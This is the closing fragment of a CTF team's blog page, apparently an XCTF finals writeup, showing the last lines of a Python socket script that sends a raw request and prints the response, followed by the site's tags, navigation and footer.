</span></span><span class=line><span class=cl><span class=n>request</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>request</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>response</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x2000</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><div class=blog-tags><a href=https://su-team.cn/tags/xctffinals/>XCTFfinals</a>&nbsp;</div><h4 class=see-also>See also</h4><ul><li><a href=/post/xctffinals-2023-su-wu/>2023 XCTFfinals SU Writeup</a></li></ul></article><ul class="pager blog-pager"><li class=previous><a href=https://su-team.cn/post/rctf-2024-su-wu/ data-toggle=tooltip data-placement=top title="2024 RCTF SU WriteUp">&larr; Previous Post</a></li><li class=next><a href=https://su-team.cn/post/2025-suctf-official-writeup-docker/ data-toggle=tooltip data-placement=top title="2025 SUCTF å®˜æ–¹WriteUp&amp;Docker">Next Post &rarr;</a></li></ul></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href=https://ctftime.org/team/29641 title=CTFTime><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<img src=https://su-team.cn/img/ctftime.svg title=CTFTime alt=CTFTime style=width:60%;height:60%;position:absolute;top:20%;left:20%></span></a></li><li><a href=mailto:suers_xctf@126.com title="Email me"><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fas fa-envelope fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://github.com/team-su title=GitHub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="credits copyright text-muted"><a href=https://su-team.cn>SUer</a>
&nbsp;&bull;&nbsp;&copy;
2026
&nbsp;&bull;&nbsp;
<a href=https://su-team.cn/>su-team</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.148.2</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a></p></div></div></div></footer><script defer src=https://su-team.cn/js/katex.min.js></script><script defer src=https://su-team.cn/js/auto-render.min.js></script><script src=https://su-team.cn/js/jquery-3.7.0.slim.min.js></script><script src=https://su-team.cn/js/bootstrap.min.js></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\begin{equation}",right:"\\end{equation}",display:!0},{left:"\\begin{align}",right:"\\end{align}",display:!0},{left:"\\begin{alignat}",right:"\\end{alignat}",display:!0},{left:"\\begin{gather}",right:"\\end{gather}",display:!0},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script><script src=https://su-team.cn/js/main.js></script><script src=https://su-team.cn/js/photoswipe.min.js></script><script src=https://su-team.cn/js/photoswipe-ui-default.min.js></script><script src=https://su-team.cn/js/load-photoswipe.js></script></body></html>